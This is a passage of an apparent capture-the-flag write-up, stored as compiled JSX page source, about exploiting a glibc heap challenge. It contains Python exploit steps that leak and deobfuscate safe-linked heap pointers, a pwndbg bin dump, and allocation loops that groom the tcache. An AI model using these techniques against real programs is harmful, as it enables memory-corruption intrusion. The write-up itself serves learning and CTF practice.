punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"\u0026\"}),\"ptr\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" ptr\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"})]})]}),`\n`]})]})}),`\n`,(0,n.jsxs)(e.p,{children:[\"When a block is freed and ends up in one of the faster lists of malloc, it mangles them with the \",(0,n.jsx)(e.em,{children:\"position\"}),\" that it is stored in.\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"There\\u2019s a couple ways to get a leak, but I followed \",(0,n.jsx)(e.a,{href:\"https://ctftime.org/writeup/34804\",children:\"this writeup\"}),\" from AeroCTF. If both allocations are in the same page (4096 bytes), then the first 12 bits of \",(0,n.jsx)(e.code,{children:\"pos\"}),\" are 0, since the position is shifted by 12. We can deobfuscate a heap ptr independently using the following function:\"]}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsxs)(e.code,{className:\"language-py code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"deobfuscate\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"val\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    mask \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0xfff\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"\u003c\u003c\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"52\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"while\"}),\" mask\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        v \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" val \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"\u0026\"}),` mask\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        val \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"^\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"v \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"\u003e\u003e\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"12\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        mask \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"\u003e\u003e\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"12\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),` val\n`]})]})}),`\n`,(0,n.jsxs)(e.p,{children:[\"This will just give us a heap base address from any leak. There was probably an \",(0,n.jsx)(e.a,{href:\"https://ret2school.github.io/post/catastrophe/\",children:\"easier method\"}),\", but I\\u2019m learning as I go.\"]}),`\n`,(0,n.jsx)(e.p,{children:\"With that, I was doing some testing so there are unnecessary allocs and frees here (but I\\u2019m too afraid to change the script due to offsets)\"}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsxs)(e.code,{className:\"language-py code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"#Grab some blocks\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"128\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'A'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"128\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'A'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"2\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"128\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'A'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"#excess\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"3\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"128\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'A'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"#excess\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"# Place them into the tcache\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"free\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"free\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"free\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"2\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"show\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"show\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"#This printed out a heap address\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"addr \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" show\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"2\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"free\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"3\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"#Parse, deobfuscate, and set heap base.\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"addr \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"int\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"addr\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"5\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token builtin\",children:\"hex\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"16\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"heap_leak \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" deobfuscate\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"addr\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"# seccomp actually alloc'd over a page of memory,\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"# so base was -0x1000 from what I got.\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"heap \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"heap_leak \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"\u003e\u003e\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"12\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"\u003c\u003c\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"12\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x1000\"}),`\n`]})]})}),`\n`,(0,n.jsx)(e.p,{children:\"From here, we need to talk about what we actually have been interacting with. The tcache is an array of linked lists which store freed chunks on a per-thread basis. The linked lists are indexed in order, and correspond to chunks of size 16-1032 bytes, increments of 16 bytes. This is a speedup in practice, as there is necessary thread safety operations when trying to alloc in general, since heap is shared among threads, where as this is a custom cache for each thread of your program. The big thing comes from the fact that they are terribly exploitable.\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"However, seccomp alloc'd and freed a lot of memory prior, so when debugging with pwndbg, I can check the bins with \",(0,n.jsx)(e.code,{children:\"bins\"}),\" or their specific names \",(0,n.jsx)(e.code,{children:\"tcachebins\"}),\", \",(0,n.jsx)(e.code,{children:\"fastbins\"}),\", etc. And I noticed that there was a lot of mess before I wanted to start actual exploit development:\"]}),`\n`,(0,n.jsx)(e.pre,{className:\"language-c\",children:(0,n.jsxs)(e.code,{className:\"language-c code-highlight\",children:[(0,n.jsx)(e.span,{className:\"code-line\",children:`tcachebins\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"0x20\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),\"  \",(0,n.jsx)(e.span,{className:\"token number\",children:\"7\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\":\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea1fd0\"}),\" \\u2014\\u25B8 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea2280\"}),\" \\u2014\\u25B8 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea1750\"}),\" \\u2014\\u25B8 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea1e30\"}),\" \\u2014\\u25B8 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea1c90\"}),\" \\u2014\\u25B8 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea1af0\"}),` \\u2014\\u25B8\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea16c0\"}),\" \\u25C2\\u2014 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x0\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"0x70\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),\"  \",(0,n.jsx)(e.span,{className:\"token number\",children:\"7\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\":\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea1990\"}),\" \\u2014\\u25B8 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea1b30\"}),\" \\u2014\\u25B8 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea1cd0\"}),\" \\u2014\\u25B8 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea1e70\"}),\" \\u2014\\u25B8 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea2010\"}),\" \\u2014\\u25B8 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea2190\"}),` \\u2014\\u25B8\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea16e0\"}),\" \\u25C2\\u2014 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x0\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"0x80\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),\"  \",(0,n.jsx)(e.span,{className:\"token number\",children:\"7\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\":\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea18f0\"}),\" \\u2014\\u25B8 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea1a70\"}),\" \\u2014\\u25B8 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea1c10\"}),\" \\u2014\\u25B8 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea1db0\"}),\" \\u2014\\u25B8 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea1f50\"}),\" \\u2014\\u25B8 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea2200\"}),` \\u2014\\u25B8\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea1640\"}),\" \\u25C2\\u2014 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x0\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"0x90\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),\"  \",(0,n.jsx)(e.span,{className:\"token number\",children:\"4\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\":\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea1530\"}),\" \\u2014\\u25B8 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea14a0\"}),\" \\u2014\\u25B8 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea1800\"}),\" \\u2014\\u25B8 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea1770\"}),\" \\u25C2\\u2014 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x0\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"0xd0\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),\"  \",(0,n.jsx)(e.span,{className:\"token number\",children:\"5\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\":\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea1170\"}),\" \\u2014\\u25B8 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea0e40\"}),\" \\u2014\\u25B8 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea0b10\"}),\" \\u2014\\u25B8 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea07e0\"}),\" \\u2014\\u25B8 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea0350\"}),\" \\u25C2\\u2014 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x0\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"0xf0\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),\"  \",(0,n.jsx)(e.span,{className:\"token number\",children:\"2\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\":\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea2080\"}),\" \\u2014\\u25B8 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea1370\"}),\" \\u25C2\\u2014 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x0\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`fastbins\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`unsortedbin\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"all\",(0,n.jsx)(e.span,{className:\"token operator\",children:\":\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea15b0\"}),\" \\u2014\\u25B8 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x7f8ff5a19ce0\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"main_arena\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"96\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \\u25C2\\u2014 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea15b0\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`smallbins\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"0x20\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\":\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea2160\"}),\" \\u2014\\u25B8 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea1fe0\"}),\" \\u2014\\u25B8 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea1e40\"}),\" \\u2014\\u25B8 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea1ca0\"}),\" \\u2014\\u25B8 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea1b00\"}),\" \\u25C2\\u2014 \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"0x60\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\":\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea1880\"}),\" \\u2014\\u25B8 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x7f8ff5a19d30\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"main_arena\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"176\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \\u25C2\\u2014 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea1880\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"0x70\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\":\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea19f0\"}),\" \\u2014\\u25B8 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea1b90\"}),\" \\u2014\\u25B8 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea1d30\"}),\" \\u2014\\u25B8 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea1ed0\"}),\" \\u2014\\u25B8 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x7f8ff5a19d40\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"main_arena\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"192\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \\u25C2\\u2014 \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),`\n`]})]})}),`\n`,(0,n.jsx)(e.p,{children:\"To remedy this, I just made a bunch of allocs (and leaked memory), until all of the bins were empty (yes, 16 is there twice, dont worry about it):\"}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsxs)(e.code,{className:\"language-py code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"print\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"Cleaning tcaches + smallbins\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"for\"}),\" i \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"in\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"range\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"7\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"15\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"16\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'A'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"for\"}),\" i \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"in\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"range\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"7\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"15\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x60\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'A'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"for\"}),\" i \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"in\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"range\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"7\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"15\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x70\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'A'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"for\"}),\" i \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"in\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"range\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"4\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"15\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x80\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'A'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"for\"}),\" i \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"in\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"range\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"5\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"15\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0xc0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'A'\"}),(0,n.jsx)(e.span,{className:\"token 